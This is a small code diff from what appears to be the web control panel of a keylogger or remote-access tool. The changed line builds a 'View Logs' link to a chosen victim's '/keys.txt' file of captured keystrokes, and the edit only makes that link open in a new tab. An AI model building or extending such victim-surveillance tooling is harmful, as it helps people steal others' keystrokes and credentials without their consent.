@@ -95,7 +95,7 @@
 //keylog
 
     $("#keylogview").on('click', function() { 
-        var data = '<a href="http://' + ips[$("#victim").val()] + '/keys.txt">View Logs</a>';
+        var data = '<a target="__blank" href="http://' + ips[$("#victim").val()] + '/keys.txt">View Logs</a>';
                 $("#cmd-op-body").html(data);
                 $("#cmd-op").modal('show');
             
